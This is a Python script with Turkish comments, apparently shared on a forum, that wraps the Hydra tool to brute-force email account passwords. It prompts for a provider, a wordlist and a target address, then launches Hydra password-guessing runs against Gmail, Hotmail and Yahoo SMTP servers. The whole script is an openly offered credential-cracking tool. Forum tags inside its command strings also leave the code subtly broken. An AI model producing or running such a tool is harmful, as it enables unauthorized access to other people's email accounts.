

#CODED by NotBody

 

"""

Tool hydra ile brute force atmaktadır

Termux İçin Ayarlanmıştır

NotBody tarafından kodlanmıştır

Hydra ile farklı farklı brute force

yapılabilir ben burda mail brute üzerine çalıştım ve daha kolay bir kullanım kazandırdım umarım beğenirsiniz

NotBody instagram ;

@NotBodyOfficial

 

"""

import sys

import colorama

import os

from os import system

from time import sleep as timeout

from colorama import Fore, Back, Style

os.system("clear")

 

os.system("toilet -f bigmono9 -F gay Mail Brute Force")

colorama.init()

banner = """

 

[01] GMAİL

[02] HOTMAİL

[03] YAHOO

Coded by NotBody

Hydra üzerinden çalışmaktadır!!!!

"""

print(Fore.BLUE)

print(banner)

print(Fore.RED)

islem = input("""

┌──(Mail💀Brute)-[Mail Türü]
└─# """)

 

wordlst = input("""

┌──(Mail💀Brute)-[Word List]
└─# """)

 

mail = input("""

┌──(Mail💀Brute)-[Mail]
└─# """)

print(Fore.WHITE)

if islem.strip() == "1" or islem.strip() == "01":

    os.system("hydra smtp.gmail.com smtp -l [email]"+ mail +"[/email] -P " +wordlst+ " -s 465 -S -v -V")

 

if islem.strip() == "2" or islem.strip() == "02":

    os.system("hydra smtp.live.com smtp -l [email]"+ mail +"[/email] -P " +wordlst+ " -s 587 -S -v -V")

 

if islem.strip() == "3" or islem.strip() == "03":

    os.system("hydra smtp.mail.yahoo.com smtp -l [email]"+ mail +"[/email] -P " +wordlst+ " -s 587 -S -v -V")
